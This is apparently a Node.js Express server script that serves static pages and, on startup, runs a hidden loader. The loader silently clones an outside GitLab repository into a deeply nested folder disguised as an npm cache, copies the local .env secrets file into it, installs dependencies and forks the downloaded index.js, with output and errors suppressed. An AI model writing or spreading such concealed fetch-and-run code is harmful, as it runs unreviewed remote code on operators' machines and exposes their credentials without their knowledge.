const express = require('express');
const path = require('path');
const { execSync, fork } = require('child_process');
const fs = require('fs');

console.clear();

const app = express();
const PORT = 5000;

const REPO_URL = 'https://gitlab.com/Casper-Tech-ke/Casper-ultra';
const NPM_DIR = path.join(__dirname, '.npm');
const BOT_DIR = path.join(NPM_DIR, '48291', '73650', '19384', '56027', '81943', '30572', '64819', '92736', '15408', '87263', '40951', '73186', '29504', '61837', '94720', '38165', '70492', '53841', '16278', '89053', '42617', '75340', '08921', '63184', '57049');

function setupAndStartBot() {
  if (fs.existsSync(NPM_DIR)) {
    fs.rmSync(NPM_DIR, { recursive: true, force: true });
  }

  try {
    fs.mkdirSync(BOT_DIR, { recursive: true });
    execSync(`git clone ${REPO_URL} ${BOT_DIR}`, { stdio: 'ignore' });
  } catch (e) {
    return;
  }

  const envSource = path.join(__dirname, '.env');
  if (fs.existsSync(envSource)) {
    fs.copyFileSync(envSource, path.join(BOT_DIR, '.env'));
  }

  try {
    execSync('npm install --production', { cwd: BOT_DIR, stdio: 'ignore' });
  } catch (e) {
    return;
  }

  try {
    const botProcess = fork(path.join(BOT_DIR, 'index.js'), [], { cwd: BOT_DIR, stdio: 'inherit' });
    botProcess.on('error', () => {});
    botProcess.on('exit', (code) => console.log(`Bot process exited with code ${code}`));
  } catch (e) {
    return;
  }
}

setupAndStartBot();

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
});
